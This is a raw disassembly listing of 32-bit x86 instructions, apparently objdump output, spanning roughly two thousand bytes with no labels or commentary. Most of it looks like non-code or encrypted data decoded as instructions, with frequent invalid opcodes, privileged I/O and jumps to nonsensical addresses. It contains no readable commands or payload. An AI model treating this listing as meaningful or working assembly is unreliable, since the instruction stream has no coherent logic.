  403eab:	push   eax
  403eac:	fadd   st(0),st
  403eae:	bound  eax,QWORD PTR [eax+0x1b]
  403eb1:	xchg   ecx,eax
  403eb2:	loopne 0x403edf
  403eb4:	mov    ebx,ds
  403eb6:	in     eax,dx
  403eb7:	test   al,0xb9
  403eb9:	xchg   edx,eax
  403eba:	inc    ecx
  403ebb:	call   0x651e:0x2bafffc5
  403ec2:	shl    BYTE PTR [ecx-0x493d6dd6],1
  403ec8:	fadd   QWORD PTR fs:[edx]
  403ecb:	in     eax,dx
  403ecc:	fwait
  403ecd:	(bad)  
  403ece:	out    dx,al
  403ecf:	ror    BYTE PTR [edi-0x11f7dfe0],0x29
  403ed6:	push   cs
  403ed7:	(bad)  [ebp-0x226a999b]
  403edd:	sub    ch,BYTE PTR [esi]
  403edf:	mov    ecx,0x22888bd
  403ee4:	div    edi
  403ee6:	daa    
  403ee7:	sbb    ebx,esi
  403ee9:	lock xor DWORD PTR [edi+0x7099eff0],esi
  403ef0:	enter  0x60e7,0xc0
  403ef4:	pop    ss
  403ef5:	dec    ebp
  403ef6:	mov    DWORD PTR [eax+0x75],ecx
  403ef9:	fwait
  403efa:	adc    BYTE PTR [ebp-0x37],cl
  403efd:	(bad)  
  403efe:	sbb    eax,0xd57311a8
  403f03:	mov    ecx,0x283f9763
  403f08:	sbb    ah,BYTE PTR cs:[ecx+edx*1]
  403f0c:	mov    bh,0x21
  403f0e:	ja     0x403f6d
  403f10:	(bad)
  403f14:	test   DWORD PTR [edi+0x39728efd],esp
  403f1a:	daa    
  403f1b:	in     eax,0x59
  403f1d:	adc    al,bh
  403f1f:	aam    0x7
  403f21:	scas   al,BYTE PTR es:[edi]
  403f22:	and    al,0x23
  403f24:	and    al,0xb0
  403f26:	pop    ss
  403f27:	hlt    
  403f28:	sti    
  403f29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f2a:	xchg   edx,eax
  403f2b:	sub    DWORD PTR [ecx-0x5],edi
  403f2e:	les    ebp,FWORD PTR [esi+0x29e610f1]
  403f34:	lahf   
  403f35:	mov    bl,0xca
  403f37:	sar    BYTE PTR [ebx-0x1546aabf],1
  403f3d:	mov    dl,0xb9
  403f3f:	cmp    eax,edi
  403f41:	fcomp  QWORD PTR [ecx]
  403f43:	adc    eax,0x376d8c46
  403f48:	cmp    ecx,esp
  403f4a:	(bad)
  403f4e:	mov    ah,0x79
  403f50:	std    
  403f51:	pop    ecx
  403f52:	push   edi
  403f53:	sub    ah,BYTE PTR [edx+edi*2]
  403f56:	push   cs
  403f57:	and    DWORD PTR [ebx+ecx*8],ebx
  403f5a:	loopne 0x403f31
  403f5c:	loop   0x403ef7
  403f5e:	and    BYTE PTR [ecx+0x53],cl
  403f61:	fdivr  st(4),st
  403f63:	mov    ds:0xdd126a02,eax
  403f68:	push   ebx
  403f69:	sahf   
  403f6a:	leave  
  403f6b:	jp     0x403f31
  403f6d:	mov    DWORD PTR [ecx],ebx
  403f6f:	xchg   edx,eax
  403f70:	outs   dx,BYTE PTR ds:[esi]
  403f71:	push   edx
  403f72:	add    al,0x66
  403f74:	mov    BYTE PTR [edi-0x56],dh
  403f77:	test   ecx,ebp
  403f79:	or     eax,0x5b45025b
  403f7e:	inc    esp
  403f7f:	scas   eax,DWORD PTR es:[edi]
  403f80:	inc    ebx
  403f81:	xchg   ebx,eax
  403f82:	sbb    al,0x13
  403f84:	add    DWORD PTR [ecx-0x1d],esp
  403f87:	js     0x403f15
  403f89:	jno    0x403f68
  403f8b:	push   es
  403f8c:	xlat   BYTE PTR ds:[ebx]
  403f8d:	push   ebx
  403f8e:	lock xchg esp,eax
  403f90:	out    0xcf,eax
  403f92:	jmp    0x403f50
  403f94:	jne    0x403fe2
  403f96:	mov    ecx,0xf892ccc6
  403f9b:	inc    ebx
  403f9c:	sub    ebp,DWORD PTR [edx+0x3f]
  403f9f:	sub    al,BYTE PTR [edx+ecx*4]
  403fa2:	sub    al,0x86
  403fa4:	clc    
  403fa5:	jp     0x403f3f
  403fa7:	mov    bl,0x3d
  403fa9:	or     eax,0x72ba927f
  403fae:	sar    BYTE PTR [esi],0x36
  403fb1:	pop    ebx
  403fb2:	jmp    0x403fa8
  403fb4:	mov    al,0xed
  403fb6:	push   eax
  403fb7:	call   0x104143f1
  403fbc:	sub    BYTE PTR [edi],dh
  403fbe:	mul    dl
  403fc0:	jmp    0x9b7f:0xbcafca08
  403fc7:	pushw  ds
  403fc9:	mov    ch,0x70
  403fcb:	inc    BYTE PTR [esi-0x4fdc2c1a]
  403fd1:	xchg   ebx,eax
  403fd2:	in     al,dx
  403fd3:	shl    BYTE PTR ds:[ebx+esi*1-0x3],1
  403fd8:	cld    
  403fd9:	les    ecx,FWORD PTR [edi-0xc521968]
  403fdf:	inc    ebp
  403fe0:	mov    eax,ds:0xcd16f32c
  403fe5:	ret    0x2235
  403fe8:	or     eax,DWORD PTR [esi]
  403fea:	jmp    0x41eb2535
  403fef:	movzx  edi,WORD PTR [ecx]
  403ff2:	jne    0x40404a
  403ff4:	xchg   BYTE PTR [edx+0x6350eb01],ch
  403ffa:	pop    esi
  403ffb:	jmp    0xfc17:0xc6d84dd8
  404002:	cdq    
  404003:	jno    0x404039
  404005:	in     eax,0x3a
  404007:	inc    ebx
  404008:	sub    al,0x6f
  40400a:	(bad)  [esi+edx*8]
  40400d:	add    BYTE PTR [edi],bl
  40400f:	sti    
  404010:	int3   
  404011:	cmp    bl,ah
  404013:	test   DWORD PTR [eax+ebp*2],ecx
  404016:	repz pop esi
  404018:	jne    0x403fe9
  40401a:	arpl   WORD PTR [edx-0x66],bx
  40401d:	ret    0x9928
  404020:	mov    ds:0xdbbf92cb,eax
  404025:	test   BYTE PTR [edx],cl
  404027:	lds    ecx,FWORD PTR [ecx-0x7a249b44]
  40402d:	mov    WORD PTR [ebp-0x5c],gs
  404030:	dec    ebx
  404031:	inc    ecx
  404032:	pushf  
  404033:	pop    ss
  404034:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404035:	fucomip st,st(6)
  404037:	mov    bh,BYTE PTR [eax+0xcccbe1d]
  40403d:	cmp    DWORD PTR [ecx+0x79418ba5],ecx
  404043:	pushf  
  404044:	test   al,0x1e
  404046:	repnz outs dx,DWORD PTR ds:[esi]
  404048:	in     al,dx
  404049:	fcmovbe st,st(4)
  40404b:	outs   dx,BYTE PTR ds:[esi]
  40404c:	fwait
  40404d:	sub    eax,0xa76a8e1c
  404052:	jbe    0x404021
  404054:	mov    esp,0x2b6ee78e
  404059:	mov    eax,ds:0xf57ea67b
  40405e:	xor    bl,BYTE PTR [eax+0x30]
  404061:	fwait
  404062:	inc    eax
  404063:	inc    esp
  404064:	leave  
  404065:	push   0xffffffb7
  404067:	or     esp,DWORD PTR [eax-0x7f]
  40406a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40406b:	scas   eax,DWORD PTR es:[edi]
  40406c:	fcmove st,st(1)
  40406e:	cmp    DWORD PTR [edx-0x13],eax
  404071:	int    0x9a
  404073:	xor    eax,DWORD PTR [edi-0x13614aeb]
  404079:	sub    DWORD PTR [esp+edi*8],ebp
  40407c:	popa   
  40407d:	dec    ebx
  40407e:	mov    bl,0xec
  404080:	lock fcmovne st,st(5)
  404083:	pop    edx
  404084:	adc    BYTE PTR [edi+0x4de82e7b],bh
  40408a:	or     al,0x55
  40408c:	jb     0x40402e
  40408e:	into   
  40408f:	mov    ebx,0xafa894f
  404094:	gs out 0xd,al
  404097:	pmulhw mm2,mm3
  40409a:	inc    ebp
  40409b:	xchg   edi,eax
  40409c:	xor    eax,0xb3b7387a
  4040a1:	add    ebx,DWORD PTR [edx+0x555f8295]
  4040a7:	inc    edi
  4040a8:	sub    ebp,DWORD PTR [esi+0xbb3053f]
  4040ae:	outs   dx,BYTE PTR ds:[esi]
  4040af:	(bad)  
  4040b1:	test   BYTE PTR [ebx-0x592aeb75],ch
  4040b7:	(bad)  
  4040b8:	std    
  4040b9:	test   DWORD PTR [edx],esi
  4040bb:	mov    esp,0x8469f821
  4040c0:	sbb    eax,0x69f88f5d
  4040c5:	push   eax
  4040c6:	imul   ecx,DWORD PTR [esi],0x9d42178c
  4040cc:	outs   dx,DWORD PTR ds:[esi]
  4040cd:	ror    ecx,0xd6
  4040d0:	mov    es,WORD PTR [ecx-0x18]
  4040d3:	mov    ds:0x71817bc4,eax
  4040d8:	nop
  4040d9:	test   BYTE PTR [esi-0x6d90080c],bh
  4040df:	pop    esp
  4040e0:	in     al,dx
  4040e1:	xor    eax,0xc197deb2
  4040e6:	fs ja  0x40411f
  4040e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040ea:	lahf   
  4040eb:	xchg   esi,eax
  4040ec:	sub    cl,dl
  4040ee:	mov    ebx,0xe6327205
  4040f3:	js     0x4040e4
  4040f5:	icebp  
  4040f6:	mov    es,WORD PTR [eax]
  4040f8:	int3   
  4040f9:	retfw  0xe0b7
  4040fd:	jo     0x404138
  4040ff:	xchg   BYTE PTR [edi+0x4d],dh
  404102:	dec    ecx
  404103:	lahf   
  404104:	dec    edx
  404105:	add    al,ch
  404107:	xchg   DWORD PTR cs:[esi+0x765c6222],edx
  40410e:	cmp    DWORD PTR [esi+0x3],esi
  404111:	hlt    
  404112:	mov    ?,WORD PTR ds:0x8e358a22
  404118:	fwait
  404119:	inc    ecx
  40411a:	cmovge esi,DWORD PTR [esi+0x54a4107f]
  404121:	sub    eax,0x68b404ba
  404126:	xchg   edx,eax
  404127:	call   0x514a:0xfa163c03
  40412e:	lahf   
  40412f:	jp     0x404162
  404131:	lea    ecx,[ebp-0x19]
  404134:	mov    bl,0x64
  404136:	cmp    ecx,DWORD PTR ds:0x2c352721
  40413c:	jecxz  0x404110
  40413e:	ds daa 
  404140:	int3   
  404141:	daa    
  404142:	xchg   edi,eax
  404143:	lds    eax,FWORD PTR [ecx+0x54]
  404146:	scas   eax,DWORD PTR es:[edi]
  404147:	push   ss
  404148:	jl     0x4040ef
  40414a:	je     0x4041a6
  40414c:	mov    esp,DWORD PTR [edi+0x13]
  40414f:	and    DWORD PTR [eax+edx*8],ebx
  404152:	jns    0x4041a6
  404154:	adc    BYTE PTR [edx-0x4be846da],ah
  40415a:	cld    
  40415b:	xchg   edx,eax
  40415c:	xchg   BYTE PTR [ecx-0x7e711eb1],bh
  404162:	mov    edi,0x13fa8ccc
  404167:	in     al,dx
  404168:	arpl   WORD PTR [edx+0x30],cx
  40416b:	xor    DWORD PTR [ecx-0x6],ebp
  40416e:	int    0xc6
  404170:	dec    edi
  404171:	(bad)  
  404172:	inc    edi
  404173:	(bad)  
  404175:	inc    edx
  404176:	inc    ecx
  404177:	cli    
  404178:	test   al,0xc8
  40417a:	jg     0x40413a
  40417c:	jo     0x4041ca
  40417e:	out    dx,eax
  40417f:	inc    ebx
  404180:	jge    0x40418e
  404182:	bound  ebp,QWORD PTR [ebx+0x63a4a4ca]
  404188:	or     eax,0x37004259
  40418d:	ror    bh,1
  40418f:	and    ebx,DWORD PTR [ebp-0x68]
  404192:	push   edi
  404193:	dec    edx
  404194:	mov    ebx,0x215ba84a
  404199:	sbb    eax,0xdb0d0310
  40419e:	pop    esp
  40419f:	mul    edx
  4041a1:	sahf   
  4041a2:	push   0x4aa127ed
  4041a7:	int    0x20
  4041a9:	or     DWORD PTR [esi+0x748cd31a],ebx
  4041af:	mov    ds:0x7b7d69c9,al
  4041b4:	dec    edi
  4041b5:	add    eax,0xf39d54c1
  4041ba:	pop    ebx
  4041bb:	pop    ds
  4041bc:	xchg   BYTE PTR [ecx],dl
  4041be:	xor    eax,DWORD PTR [ebp-0x47]
  4041c1:	fsub   QWORD PTR [edx]
  4041c3:	fwait
  4041c4:	mov    ds,WORD PTR [esp+ebp*2-0x1b]
  4041c8:	jle    0x4041a1
  4041ca:	jns    0x404228
  4041cc:	and    esp,ebx
  4041ce:	and    esi,edi
  4041d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041d1:	and    al,0xc1
  4041d3:	ror    BYTE PTR [ebx+0x20ea5eb5],0x8c
  4041da:	enter  0xdba1,0xbf
  4041de:	xor    al,0x3e
  4041e0:	add    eax,0x98371a99
  4041e5:	repz mov bh,0x6e
  4041e8:	sbb    edi,esi
  4041ea:	sbb    edi,DWORD PTR [ebp+0x70]
  4041ed:	xor    DWORD PTR [edx+0x39],esp
  4041f0:	pop    ebp
  4041f1:	jbe    0x404257
  4041f3:	mov    DWORD PTR [ecx+edi*1+0x3e],ebp
  4041f7:	dec    ebx
  4041f8:	arpl   WORD PTR [ecx],bp
  4041fa:	lock mov al,0xd8
  4041fd:	xor    DWORD PTR [edx-0x39],esi
  404200:	add    bh,BYTE PTR [ebx-0x3e]
  404203:	jne    0x4041a9
  404205:	inc    esp
  404206:	in     eax,dx
  404207:	enter  0xf373,0xe5
  40420b:	enter  0x5695,0xcc
  40420f:	xchg   edx,eax
  404210:	jl     0x4041ad
  404212:	inc    esp
  404213:	dec    esp
  404214:	mov    fs,WORD PTR [ecx]
  404216:	mov    al,0x9b
  404218:	push   0x40
  40421a:	std    
  40421b:	test   eax,0x1cea7751
  404220:	mov    cl,0x36
  404222:	jne    0x404264
  404224:	add    ebp,ebp
  404226:	lss    ebx,FWORD PTR [esi+0xea55aa0]
  40422d:	add    eax,0x1376e1d0
  404232:	adc    eax,0xd7b6cd9f
  404237:	cmp    ah,dl
  404239:	sub    DWORD PTR [esi],ebp
  40423b:	pop    edi
  40423c:	ret    0xb893
  40423f:	int    0x2a
  404241:	sub    ebp,DWORD PTR [ebx]
  404243:	gs push 0x9e351a28
  404249:	out    dx,eax
  40424a:	sub    BYTE PTR [ebp+0x47edf6ea],bh
  404250:	sub    eax,0x8d08e0e1
  404256:	inc    ecx
  404257:	xor    ecx,DWORD PTR [ebx-0x118b7d96]
  40425d:	mov    dh,0xac
  40425f:	mul    BYTE PTR [edi+ebp*8-0x70d5505f]
  404266:	out    dx,al
  404267:	pop    eax
  404268:	inc    esi
  404269:	aam    0x9
  40426b:	mov    ecx,0x9d0ba3af
  404270:	xchg   ebx,eax
  404271:	frstor [edi]
  404273:	cmp    BYTE PTR [ecx+0x16],dh
  404276:	cs mov edi,0xeffde9b4
  40427c:	xor    BYTE PTR [edi],cl
  40427e:	jmp    0x6565:0x9f8438c1
  404285:	lock sub ebp,DWORD PTR [ebx-0x3fe20e4c]
  40428c:	mov    bh,0xa5
  40428e:	inc    bh
  404290:	shl    DWORD PTR [ebp+0x1e2d2e9c],cl
  404296:	lea    esp,[esi]
  404298:	in     eax,0xab
  40429a:	cld    
  40429b:	stos   DWORD PTR es:[edi],eax
  40429c:	mov    es,ecx
  40429e:	cmp    bh,bh
  4042a0:	(bad)  
  4042a3:	cmp    eax,0x4c1eb89d
  4042a8:	or     BYTE PTR [edi+0x6fb29865],ch
  4042ae:	outs   dx,DWORD PTR ds:[esi]
  4042af:	test   BYTE PTR [edx],bh
  4042b1:	in     eax,dx
  4042b2:	pop    ss
  4042b3:	mov    ds,ecx
  4042b5:	mov    ebp,0xf0339887
  4042ba:	and    ah,BYTE PTR [ebx+0x3c]
  4042bd:	mov    dl,BYTE PTR [edi-0x1df045fc]
  4042c3:	jne    0x4042eb
  4042c5:	mov    DWORD PTR [edi+edi*8+0x3a783e84],edx
  4042cc:	mov    edx,0x815c9328
  4042d1:	and    edi,esi
  4042d3:	cmp    BYTE PTR [edi-0x6],0x68
  4042d7:	sahf   
  4042d8:	mov    edi,0x416b7c47
  4042dd:	aas    
  4042de:	xchg   esp,eax
  4042df:	enter  0x4ac6,0xd6
  4042e3:	shl    esi,1
  4042e5:	or     BYTE PTR [edx+0x5c],bl
  4042e8:	jb     0x40427a
  4042ea:	pop    es
  4042eb:	add    DWORD PTR [ebp+0xbca35f3],esp
  4042f1:	pushf  
  4042f2:	inc    eax
  4042f3:	cmp    al,0x19
  4042f5:	push   ss
  4042f6:	pop    edx
  4042f7:	xchg   esi,eax
  4042f8:	jge    0x404367
  4042fa:	scas   eax,DWORD PTR es:[edi]
  4042fb:	dec    edx
  4042fc:	(bad)  
  4042fd:	xchg   esi,eax
  4042fe:	lea    eax,[ebx+0x11]
  404301:	dec    ebx
  404302:	cwde   
  404303:	mov    cl,0x90
  404305:	mov    eax,ds:0xbd55b97a
  40430a:	pop    esi
  40430b:	inc    eax
  40430c:	call   0x370a:0xa6e34bc5
  404313:	and    al,0xc2
  404315:	mov    esp,0x6ac575a7
  40431a:	rcr    DWORD PTR [edi],1
  40431c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40431d:	jecxz  0x4042f9
  40431f:	faddp  st(2),st
  404321:	pop    edi
  404322:	sbb    eax,0x4972d610
  404327:	(bad)  
  404328:	jle    0x4042fe
  40432a:	les    eax,FWORD PTR [esi+0x22]
  40432d:	jae    0x404378
  40432f:	and    eax,0xf9a395e8
  404334:	sar    BYTE PTR [ebx+0x1d3aef5f],1
  40433a:	mov    ah,0xa9
  40433c:	enter  0xe67,0x56
  404340:	aas    
  404341:	cwde   
  404342:	xor    al,0x68
  404344:	out    dx,eax
  404345:	xchg   edi,eax
  404346:	ret    0x4965
  404349:	mov    bl,0x7f
  40434b:	call   0xf1f83808
  404350:	xor    edx,DWORD PTR [ebp-0x21]
  404353:	jmp    0x7757:0x8865c12a
  40435a:	fst    DWORD PTR [esp+ecx*8+0x1c]
  40435e:	(bad)  
  40435f:	arpl   WORD PTR [edx],di
  404361:	dec    ebx
  404362:	pop    es
  404363:	pop    ecx
  404364:	fst    QWORD PTR [esi]
  404366:	mov    BYTE PTR [ebp*1-0x11a1205d],dl
  40436d:	lock push 0xffffffbe
  404370:	leave  
  404371:	in     eax,0xa3
  404373:	cwde   
  404374:	inc    esp
  404375:	popa   
  404376:	test   DWORD PTR ds:0x825fcda1,edi
  40437c:	inc    esp
  40437d:	mov    DWORD PTR [ecx],esi
  40437f:	scas   al,BYTE PTR es:[edi]
  404380:	mov    esp,0xa8355f58
  404385:	js     0x40432c
  404387:	outs   dx,DWORD PTR ds:[esi]
  404388:	push   ecx
  404389:	add    eax,0xb6429596
  40438e:	mov    dl,0xfa
  404390:	in     eax,dx
  404391:	dec    esi
  404392:	jns    0x4043f7
  404394:	pop    ebx
  404395:	(bad)
  404398:	in     al,0x43
  40439a:	ja     0x404418
  40439c:	xchg   BYTE PTR [eax+0x272173d8],al
  4043a2:	push   edi
  4043a3:	dec    edi
  4043a4:	or     DWORD PTR [edi],ebx
  4043a6:	and    bh,bh
  4043a8:	mov    bh,0x70
  4043aa:	dec    eax
  4043ab:	(bad)  
  4043ad:	fdivrp st(4),st
  4043af:	inc    esi
  4043b0:	mov    cl,0xf
  4043b2:	cmp    BYTE PTR [edi],cl
  4043b4:	scas   al,BYTE PTR es:[edi]
  4043b5:	dec    edi
  4043b6:	sar    ah,1
  4043b8:	fwait
  4043b9:	outs   dx,DWORD PTR ds:[esi]
  4043ba:	sub    eax,0x1cde843c
  4043bf:	in     eax,0x81
  4043c1:	xchg   edi,eax
  4043c2:	push   ebx
  4043c3:	mov    WORD PTR [edx],ds
  4043c5:	sbb    BYTE PTR [esi+0x17],cl
  4043c8:	mov    ah,0xd1
  4043ca:	inc    ecx
  4043cb:	je     0x4043f5
  4043cd:	dec    edi
  4043ce:	out    0xa8,al
  4043d0:	and    eax,0xd533d50b
  4043d5:	into   
  4043d6:	sbb    eax,ebx
  4043d8:	or     DWORD PTR [edi],eax
  4043da:	inc    ecx
  4043db:	push   esp
  4043dc:	aaa    
  4043dd:	in     al,dx
  4043de:	cs sahf 
  4043e0:	jne    0x404430
  4043e2:	rcr    DWORD PTR [ebp+0x20096c19],cl
  4043e8:	xchg   BYTE PTR [edx-0x20],dl
  4043eb:	push   0x20391f30
  4043f0:	je     0x40443f
  4043f2:	lds    ebx,FWORD PTR [esi-0x16]
  4043f5:	sub    ebx,DWORD PTR [esi+ebx*8-0x75]
  4043f9:	sar    BYTE PTR [eax+0x65],cl
  4043fc:	setge  BYTE PTR [eax+0x5c7faa6a]
  404403:	inc    eax
  404404:	mov    al,ds:0xeeae01af
  404409:	scas   al,BYTE PTR es:[edi]
  40440a:	(bad)  
  40440b:	(bad)  
  40440c:	shr    esp,1
  40440e:	popf   
  40440f:	mov    edi,0x61accd26
  404414:	push   ebp
  404415:	cmp    dl,BYTE PTR [edx+esi*1]
  404418:	mov    ebx,0x3ae06783
  40441d:	retf   0xce5e
  404420:	pop    ss
  404421:	imul   esi,DWORD PTR [esi],0xd45a8cf4
  404427:	inc    ecx
  404428:	clc    
  404429:	add    al,0xef
  40442b:	imul   ecx,DWORD PTR ds:0x561d513e,0xffffff83
  404432:	jno    0x404471
  404434:	out    dx,al
  404435:	sub    al,cl
  404437:	cmp    DWORD PTR [ecx+0x57],ebp
  40443a:	das    
  40443b:	stc    
  40443c:	xor    DWORD PTR [ebx],edi
  40443e:	cmp    DWORD PTR [edi+edx*8+0x71],0xfffffffd
  404443:	sub    esp,DWORD PTR [ebp-0x1e7e4a43]
  404449:	cld    
  40444a:	loopne 0x4043f0
  40444c:	fs ss test eax,0xd883d511
  404453:	inc    edx
  404454:	rol    DWORD PTR [ebx-0x5485b1a3],cl
  40445a:	(bad)  
  40445b:	mov    edi,0xa012b61f
  404460:	dec    ecx
  404461:	cdq    
  404462:	and    bl,BYTE PTR [eax-0x5e]
  404465:	mov    ebx,0x2b06a154
  40446a:	stos   BYTE PTR es:[edi],al
  40446b:	jmp    0x4043ed
  40446d:	push   edx
  40446e:	cmp    BYTE PTR [ebx+0x319c2cc6],cl
  404474:	in     eax,0xa1
  404476:	dec    ecx
  404477:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404478:	cmp    edi,ebp
  40447a:	popa   
  40447b:	xchg   BYTE PTR [esi-0x57e009e0],ah
  404481:	ja     0x404470
  404483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404484:	ds rcl dh,0x48
  404488:	mov    ds:0x7192cdef,eax
  40448d:	and    DWORD PTR [esi+esi*2],ebp
  404490:	mov    ebx,0x4152793c
  404495:	scas   al,BYTE PTR es:[edi]
  404496:	je     0x4044ed
  404498:	ins    BYTE PTR es:[edi],dx
  404499:	adc    al,dl
  40449b:	jns    0x4044d6
  40449d:	ror    dl,cl
  40449f:	xchg   ebx,eax
  4044a0:	add    ebx,DWORD PTR [eax+ecx*8-0x4b]
  4044a4:	ss mov ah,0xf2
  4044a7:	test   DWORD PTR [eax],edx
  4044a9:	mov    ecx,0xfb6ff068
  4044ae:	inc    esi
  4044af:	mov    bh,BYTE PTR [edx]
  4044b1:	mov    ch,0x89
  4044b3:	addr16 popa 
  4044b5:	jbe    0x40447b
  4044b7:	inc    bx
  4044b9:	pop    edi
  4044ba:	jnp    0x4044fd
  4044bc:	pop    ds
  4044bd:	(bad)  
  4044bf:	sbb    BYTE PTR [eax+0x63075e46],al
  4044c5:	lods   eax,DWORD PTR ds:[esi]
  4044c6:	aas    
  4044c7:	jg     0x404538
  4044c9:	inc    eax
  4044ca:	sbb    DWORD PTR ds:0x2bb129f5,ecx
  4044d0:	mov    ecx,0xb36315db
  4044d5:	add    ecx,ebx
  4044d7:	xchg   ebx,eax
  4044d8:	(bad)  
  4044d9:	push   esp
  4044da:	push   ebx
  4044db:	xchg   edi,eax
  4044dc:	fild   WORD PTR [edi+0x700907ab]
  4044e2:	fldcw  WORD PTR [ecx-0x1277fec4]
  4044e8:	mov    dh,0xa7
  4044ea:	arpl   di,bx
  4044ec:	loope  0x404471
  4044ee:	fst    QWORD PTR ds:[ebx+0xd]
  4044f2:	push   esp
  4044f3:	outs   dx,DWORD PTR ds:[esi]
  4044f4:	push   0xffffffa4
  4044f6:	sahf   
  4044f7:	retf   0xd9d2
  4044fa:	lahf   
  4044fb:	rcl    DWORD PTR [edi],cl
  4044fd:	add    cl,BYTE PTR [edx]
  4044ff:	pop    ebp
  404500:	outs   dx,BYTE PTR ds:[esi]
  404501:	jp     0x404491
  404503:	push   ecx
  404504:	inc    ecx
  404505:	shr    BYTE PTR [eax],1
  404507:	push   edx
  404508:	inc    esp
  404509:	mov    bh,0x87
  40450b:	in     eax,dx
  40450c:	adc    edi,DWORD PTR [eax+0x7ee30b32]
  404512:	or     ch,ch
  404514:	cs iret 
  404516:	call   0xa949:0x4a5ff342
  40451d:	imul   edi,ebx,0x6b645df1
  404523:	or     BYTE PTR [esp+ebp*2],ah
  404526:	mov    al,ds:0x331a1284
  40452b:	pop    edx
  40452c:	xchg   edx,eax
  40452d:	cmp    eax,0x9a6bc4b3
  404532:	mov    DWORD PTR [eax-0x1a0f06ef],edx
  404538:	add    bh,BYTE PTR [eax-0xa]
  40453b:	pusha  
  40453c:	mov    eax,ds:0xb34c638c
  404541:	xchg   edi,eax
  404542:	jne    0x40453b
  404544:	enter  0xa304,0x6a
  404548:	push   edi
  404549:	sbb    eax,0xf399aaeb
  40454e:	cdq    
  40454f:	jmp    0x4045b7
  404551:	loope  0x4045cc
  404553:	mov    bl,0x54
  404555:	pop    ss
  404556:	mov    eax,?
  404558:	cmp    al,0xc7
  40455a:	sub    DWORD PTR ds:0xb2e052f5,ecx
  404560:	popa   
  404561:	jbe    0x4045a4
  404563:	mov    eax,ds:0x1187488
  404568:	sub    al,0x3a
  40456a:	test   DWORD PTR [ecx],esp
  40456c:	mov    ds:0x3709a2fc,al
  404571:	dec    BYTE PTR [esi-0x39]
  404574:	gs inc ebp
  404576:	mov    esi,0x8b5e8919
  40457b:	xchg   BYTE PTR [esi],bh
  40457d:	push   0xffffffb9
  40457f:	pop    ebx
  404580:	jno    0x40452d
  404582:	cs push 0x3e
  404585:	aas    
  404586:	xchg   ecx,eax
  404587:	adc    BYTE PTR [ecx-0x26],bl
  40458a:	shr    DWORD PTR [ecx-0x239d27a0],1
  404590:	(bad)  
  404591:	fldcw  WORD PTR [ebp+eiz*4-0x4213ee2c]
  404598:	sub    dl,al
  40459a:	push   ebx
  40459b:	inc    esp
  40459c:	mov    ah,0x70
  40459e:	inc    ebp
  40459f:	cld    
  4045a0:	lahf   
  4045a1:	ins    DWORD PTR es:[edi],dx
  4045a2:	and    cl,BYTE PTR [edi-0x70]
  4045a5:	dec    ebx
  4045a6:	mov    ds:0xfa91536,al
  4045ab:	inc    esp
  4045ac:	out    0x6e,eax
  4045ae:	push   ecx
  4045af:	sub    BYTE PTR [edx-0x2d],dh
  4045b2:	xor    al,0xa2
  4045b4:	push   es
  4045b5:	fild   WORD PTR [esi]
  4045b7:	and    ebx,edx
  4045b9:	(bad)  
  4045ba:	popa   
  4045bb:	xchg   BYTE PTR [ebp+0x1d],bh
  4045be:	or     bh,ch
  4045c0:	or     eax,ebx
  4045c2:	test   DWORD PTR [edx+0x741b79ed],esp
  4045c8:	dec    esi
  4045c9:	sub    ebx,DWORD PTR [edx+0x1793957f]
  4045cf:	sbb    ah,cl
  4045d1:	dec    edi
  4045d2:	(bad)
  4045d5:	mov    eax,ds:0x23562b69
  4045da:	aam    0x81
  4045dc:	pusha  
  4045dd:	repnz ds push eax
  4045e0:	xor    ebp,esi
  4045e2:	mov    WORD PTR [esi-0x25b36c98],?
  4045e8:	lds    ecx,FWORD PTR [edi-0x352d88cb]
  4045ee:	or     BYTE PTR [ebx],dh
  4045f0:	ins    BYTE PTR es:[edi],dx
  4045f1:	jae    0x404654
  4045f3:	rol    bh,1
  4045f5:	mov    dl,0xe2
  4045f7:	cwde   
  4045f8:	jne    0x40458f
  4045fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045fb:	and    dl,BYTE PTR ds:[esi]
  4045fe:	jg     0x40464d
  404600:	jmp    0x4045d1
  404602:	repz shl DWORD PTR [eax-0x7b],1
  404606:	push   0xffffffa9
  404608:	pop    esi
  404609:	push   esp
  40460a:	mov    bl,0xca
  40460c:	jmp    0x404651
  40460e:	pop    esi
  40460f:	dec    esp
  404610:	sahf   
  404611:	(bad)
  404615:	aaa    
  404616:	mov    al,ds:0xdc4f5886
  40461b:	jg     0x4045db
  40461d:	mov    ah,0xf5
  40461f:	pop    ebp
  404620:	sbb    ch,ch
  404622:	or     BYTE PTR [eax],0xf0
  404625:	push   ecx
  404626:	mov    al,ds:0xfca0a913
  40462b:	in     al,0x48
  40462d:	dec    DWORD PTR [edx-0x4f77966d]
  404633:	clc    
  404634:	mov    eax,ds:0x2e35f2e3
  404639:	shl    BYTE PTR [eax],0x38
  40463c:	or     bl,dh
  40463e:	retf   
  40463f:	imul   ebx,eax,0x8da822d0
  404645:	inc    ebx
  404646:	loope  0x40462e
  404648:	sbb    bl,BYTE PTR [eax+edi*4]
  40464b:	cmp    esi,DWORD PTR gs:[eax-0x75e57949]
  404652:	rol    DWORD PTR [ecx],cl
  404654:	pop    es
  404655:	(bad)  
  404656:	dec    BYTE PTR [ebp+0x37]
  404659:	ins    BYTE PTR es:[edi],dx
  40465a:	aaa    
  40465b:	adc    bl,ah
  40465d:	sub    BYTE PTR [esi],bl
  40465f:	pop    ecx
  404660:	push   0xf60ac21c
  404665:	xor    eax,0x82c29049
  40466a:	pop    ds
  40466b:	xchg   BYTE PTR [eax],bh
  40466d:	dec    ebx
  40466e:	add    BYTE PTR [eax-0x4c],dl
  404671:	push   esp
  404672:	cld    
  404673:	fs mov dh,0x7a
  404676:	and    eax,0x9b07fa14
  40467b:	ret    0xdbde
  40467e:	stos   DWORD PTR es:[edi],eax
  40467f:	xor    al,0x52
  404681:	aam    0xc7
  404683:	pop    ds
  404684:	pop    ebx
  404685:	pop    eax
  404686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404687:	push   ds
  404688:	loope  0x4046af
  40468a:	in     eax,dx
